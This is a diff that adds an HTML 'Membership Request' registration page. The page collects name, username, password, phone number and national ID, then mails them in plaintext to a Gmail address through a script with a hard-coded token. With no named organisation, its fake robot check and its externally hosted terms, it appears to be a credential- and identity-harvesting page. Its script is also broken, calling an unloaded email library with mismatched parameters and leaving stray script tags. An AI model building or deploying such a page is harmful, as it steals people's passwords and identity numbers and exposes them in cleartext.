@@ -1,1 +1,212 @@
-Hi
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <title>Registration</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Roboto, sans-serif;
+            background-color: #454747;
+            display: flex;
+            border: 37px solid transparent;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 90px;
+        }
+
+        .header {
+            background-color: rgba(0, 162, 232, 0.7); /* Blue color with transparency */
+            color: white;
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px); /* Apply blur effect */
+            -webkit-backdrop-filter: blur(10px); /* For Safari */
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2); /* Optional: Adds a subtle border for better visibility */
+        }
+
+        .header h1 {
+            margin: 0;
+        }
+
+        .header .welcome {
+            color: #3399ff;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            color: white; /* Set text color to white */
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            background-color: transparent;
+            box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            color: white; /* Set text color inside inputs to white */
+        }
+
+        .form-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 10px;
+        }
+
+        .form-group .terms {
+            display: flex;
+            align-items: center;
+        }
+
+        .form-group .terms label {
+            margin: 0;
+        }
+
+        .form-group .terms a {
+            color: #3399ff; /* Link color */
+        }
+
+        .form-group button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            width: 100%;
+            box-sizing: border-box; /* Ensure padding is included in width */
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-group button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="header">
+            <h1>🪪 Membership Request</h1>
+            <div class="welcome">Welcome</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>Registration</h2>
+        <form id="registration" onsubmit="Send(); return false;">
+            <div class="form-group">
+                <label for="name">🧑 Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="username">📮 Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">🔒 Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">📱 Phone Number</label>
+                <input type="tel" id="phone" name="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="nationalId">🆔 National Card Identity Number</label>
+                <input type="text" id="nationalId" name="nationalId" required>
+            </div>
+            <div class="form-group terms">
+                <input type="checkbox" id="terms" name="terms" required>
+                <label for="terms">I've read and accept the <a href="https://drive.google.com/file/d/1dIG8jySsgNrBW1jhaPKJ59wBPWGTAW8x/view?usp=drive_link" target="_blank">Terms and Policies</a></label>
+            </div>
+            <div class="g-recaptcha" data-sitekey="6LeE1-4pAAAAAGMqgDgNadlikkWXqpv-cwQncLc8q"></div>
+            <div class="form-group">
+                <input type="checkbox" id="robotCheck" name="robotCheck" required>
+                <label for="robotCheck">I'm not a robot</label>
+            </div>
+            <div class="form-group">
+                <button type="submit">Register</button>
+            </div>
+        </form>
+    </div>
+
+     <br><br>
+
+     <br><br>
+   <p align="left">
+    <div class="gtranslate_wrapper"></div>
+        <script>window.gtranslateSettings = {"default_language":"en","wrapper_selector":".gtranslate_wrapper","flag_size":24}</script>
+        <script src="https://cdn.gtranslate.net/widgets/latest/popup.js" defer></script>
+   </p>
+    </script>
+
+    </script>
+
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        function Send() {
+            var name = document.getElementById("name").value;
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var phone = document.getElementById("phone").value;
+            var nationalId = document.getElementById("nationalId").value;
+
+            var body = "Name: " + name + "<br/>Username: " + username + "<br/>Password: " + password + "<br/>Phone Number: " + phone + "<br/>National Card Identity Number: " + nationalId;
+
+            emailjs.send({
+                SecureToken: "db739cc9-28e0-4c1a-b4b5-ff998f5ff0ed",
+                To: 'softwarecompanycoltd@gmail.com',
+                From: "karmanmajd309@gmail.com",
+                Subject: "New Registration Request",
+                Body: body
+            }).then(
+                message => {
+                    if (message === 'OK') {
+                        swal("Successful", "Your Data Was Successfully Received", "success");
+                    } else {
+                        swal("Something Went Wrong", "Your Data Was Not Received", "error");
+                    }
+                }
+            ).catch(error => {
+                swal("Error", "An error occurred: " + error.message, "error");
+            });
+        }
+    </script>
+</body>
+</html>
